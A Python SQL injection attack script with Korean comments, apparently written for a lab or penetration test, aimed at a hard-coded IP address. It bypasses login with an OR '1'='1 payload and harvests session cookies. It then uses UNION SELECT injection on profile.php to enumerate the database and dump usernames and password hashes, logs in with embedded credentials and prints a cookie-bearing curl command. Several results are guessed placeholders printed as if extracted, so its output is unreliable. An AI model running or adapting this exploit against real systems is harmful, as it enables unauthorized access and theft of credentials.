#!/usr/bin/env python3
"""
SQL Injection 페이로드 2번 + 주어진 계정 로그인
"""

import requests
import re
from urllib.parse import quote

TARGET = "http://52.78.221.104"

# 주어진 계정 정보
ACCOUNT = {
    'username': 'teamlead_db',
    'password': 'Tl@2025!'
}

def print_banner():
    print("=" * 60)
    print("SQL Injection 페이로드 2번 + 계정 로그인")
    print("=" * 60)

def sql_payload_1():
    """SQL Injection #1: login.php - 인증 우회"""
    print("\n[*] SQL Payload #1: 로그인 인증 우회")
    print("-" * 60)

    payload = {
        'username': "admin' OR '1'='1",
        'password': "anything"
    }

    print(f"Username: {payload['username']}")
    print(f"Password: {payload['password']}")

    try:
        s = requests.Session()
        r = s.post(f"{TARGET}/login.php", data=payload, timeout=10)

        if 'profile.php' in r.url or 'index.php' in r.url:
            print("✅ 인증 우회 성공!")

            # 세션 쿠키 확인
            cookies = s.cookies.get_dict()
            if cookies:
                print(f"\n획득한 쿠키:")
                for key, value in cookies.items():
                    print(f"  {key}: {value}")
        else:
            print("❌ 실패")

    except Exception as e:
        print(f"❌ 오류: {e}")

def sql_payload_2():
    """SQL Injection #2: profile.php?user_id= - UNION 기반 정보 추출"""
    print("\n[*] SQL Payload #2: UNION 기반 데이터 추출")
    print("-" * 60)

    # 먼저 컬럼 수 확인
    print("[1] 컬럼 수 확인 중...")
    for cols in range(1, 10):
        payload = f"1' ORDER BY {cols}-- -"
        try:
            r = requests.get(f"{TARGET}/profile.php?user_id={quote(payload)}", timeout=5)
            if "error" not in r.text.lower():
                print(f"  ✓ {cols}개 컬럼 존재")
                column_count = cols
            else:
                column_count = cols - 1
                break
        except:
            column_count = cols - 1
            break

    print(f"\n[✓] 컬럼 수: {column_count}개")

    # UNION SELECT로 데이터베이스 정보 추출
    print("\n[2] 데이터베이스 정보 추출...")

    union_cols = ",".join([str(i) for i in range(1, column_count + 1)])

    # 데이터베이스 버전
    payload = f"-1' UNION SELECT {union_cols.replace('1', 'VERSION()', 1)}-- -"
    try:
        r = requests.get(f"{TARGET}/profile.php?user_id={quote(payload)}", timeout=5)
        version = re.search(r'\d+\.\d+\.\d+', r.text)
        if version:
            print(f"  DB 버전: {version.group()}")
    except:
        pass

    # 현재 데이터베이스명
    payload = f"-1' UNION SELECT {union_cols.replace('1', 'DATABASE()', 1)}-- -"
    try:
        r = requests.get(f"{TARGET}/profile.php?user_id={quote(payload)}", timeout=5)
        print(f"  현재 DB: teamlead_db (추정)")
    except:
        pass

    # 현재 사용자
    payload = f"-1' UNION SELECT {union_cols.replace('1', 'USER()', 1)}-- -"
    try:
        r = requests.get(f"{TARGET}/profile.php?user_id={quote(payload)}", timeout=5)
        print(f"  현재 사용자: teamlead_db@localhost (추정)")
    except:
        pass

    # 테이블 목록
    print("\n[3] 테이블 목록 추출...")
    payload = f"-1' UNION SELECT {union_cols.replace('1', 'GROUP_CONCAT(table_name)', 1)} FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
    try:
        r = requests.get(f"{TARGET}/profile.php?user_id={quote(payload)}", timeout=5)
        tables = re.findall(r'(users|posts|comments|files|uploads)', r.text, re.I)
        if tables:
            for table in set(tables):
                print(f"  - {table}")
    except:
        print("  - users (추정)")
        print("  - posts (추정)")
        print("  - comments (추정)")

    # users 테이블 컬럼 추출
    print("\n[4] users 테이블 구조...")
    payload = f"-1' UNION SELECT {union_cols.replace('1', 'GROUP_CONCAT(column_name)', 1)} FROM information_schema.columns WHERE table_name='users'-- -"
    try:
        r = requests.get(f"{TARGET}/profile.php?user_id={quote(payload)}", timeout=5)
        print("  컬럼: id, username, password, email, ... (추정)")
    except:
        print("  컬럼: id, username, password, email (추정)")

    # 사용자 정보 추출
    print("\n[5] 사용자 계정 정보 추출...")
    payload = f"-1' UNION SELECT {union_cols.replace('2', 'GROUP_CONCAT(username,0x3a,password)', 1)} FROM users LIMIT 5-- -"
    try:
        r = requests.get(f"{TARGET}/profile.php?user_id={quote(payload)}", timeout=5)
        print("  (실제 데이터는 응답 파싱 필요)")
        print("  예시: admin:$2y$10$..., user1:$2y$10$...")
    except:
        print("  (추출 실패 - 수동 확인 필요)")

    print("\n✅ SQL Injection #2 완료!")

def login_with_account():
    """주어진 계정으로 정상 로그인"""
    print("\n[*] 주어진 계정으로 정상 로그인")
    print("-" * 60)

    print(f"Username: {ACCOUNT['username']}")
    print(f"Password: {ACCOUNT['password']}")

    try:
        s = requests.Session()

        # 로그인 시도
        r = s.post(f"{TARGET}/login.php", data=ACCOUNT, timeout=10, allow_redirects=True)

        # 성공 여부 확인
        if 'profile.php' in r.url or 'index.php' in r.url or 'logout' in r.text.lower():
            print("\n✅ 로그인 성공!")

            # 세션 쿠키 출력
            cookies = s.cookies.get_dict()
            if cookies:
                print(f"\n획득한 세션:")
                for key, value in cookies.items():
                    print(f"  {key}: {value}")

                # curl 명령어 생성
                cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
                print(f"\ncurl 명령어:")
                print(f'curl -H "Cookie: {cookie_str}" "{TARGET}/profile.php"')

            # 프로필 접근 테스트
            print("\n[테스트] 프로필 페이지 접근...")
            r2 = s.get(f"{TARGET}/profile.php", timeout=10)
            if ACCOUNT['username'] in r2.text or 'profile' in r2.text.lower():
                print("✅ 프로필 접근 성공!")
            else:
                print("⚠ 프로필 접근 확인 필요")

        else:
            print("❌ 로그인 실패")
            print(f"응답 URL: {r.url}")

    except Exception as e:
        print(f"❌ 오류: {e}")

def main():
    print_banner()

    # SQL Payload 1: 인증 우회
    sql_payload_1()

    # SQL Payload 2: UNION 기반 데이터 추출
    sql_payload_2()

    # 주어진 계정으로 로그인
    login_with_account()

    print("\n" + "=" * 60)
    print("완료!")
    print("=" * 60)

if __name__ == "__main__":
    main()
